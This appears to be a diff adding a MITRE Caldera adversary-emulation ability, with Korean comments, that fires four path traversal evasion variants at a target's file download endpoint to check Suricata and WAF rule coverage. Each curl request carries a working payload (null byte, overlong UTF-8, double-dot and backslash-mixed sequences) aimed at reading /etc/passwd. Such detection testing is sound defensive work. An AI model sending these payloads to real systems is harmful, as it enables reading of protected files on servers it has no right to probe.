@@ -1,0 +1,41 @@
+- id: 55e6f7a8-9b0c-4123-cef0-123456789105
+  name: Path Traversal - Advanced Evasion Variants
+  description: Null byte, Overlong UTF-8, Double dot segment, Backslash 혼합 등 고급 우회 기법 4종을 추가하여 Suricata/WAF 룰의 커버리지를 검증합니다.
+  tactic: defense-evasion
+  technique:
+    attack_id: T1027
+    name: Obfuscated Files or Information
+  platforms:
+    linux:
+      sh:
+        command: |-
+          OP_ID="#{operation_id}"
+          TECH_ID="T1027"
+          ABILITY_ID="55e6f7a8-9b0c-4123-cef0-123456789105"
+          TARGET="http://#{target.url}"
+
+          CURL_BASE=( -s -w " HTTP=%{http_code}\n" -o /dev/null
+                      -H "X-Caldera-Op-Id: ${OP_ID}"
+                      -H "X-Caldera-Technique: ${TECH_ID}"
+                      -H "X-Caldera-Ability: ${ABILITY_ID}"
+                      -A "Caldera/${OP_ID}/${TECH_ID}/${ABILITY_ID}" )
+
+          echo "[*] Path Traversal Advanced Evasion (4종 추가)"
+
+          echo "[5] Null byte injection: ../../../../etc/passwd%00.jpg"
+          curl "${CURL_BASE[@]}" \
+            "${TARGET}/api/files/download?filename=../../../../etc/passwd%00.jpg"
+
+          echo "[6] Overlong UTF-8: %c0%ae%c0%ae%c0%af (=../)"
+          curl "${CURL_BASE[@]}" \
+            "${TARGET}/api/files/download?filename=%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc%c0%afpasswd"
+
+          echo "[7] Double dot segments: ..././..././etc/passwd"
+          curl "${CURL_BASE[@]}" \
+            "${TARGET}/api/files/download?filename=..././..././..././..././etc/passwd"
+
+          echo "[8] Backslash+forward mix: ..\/..\/etc/passwd"
+          curl "${CURL_BASE[@]}" \
+            "${TARGET}/api/files/download?filename=..%5C/..%5C/..%5C/..%5C/etc/passwd"
+
+          echo "[*] Advanced PT Evasion 종료"
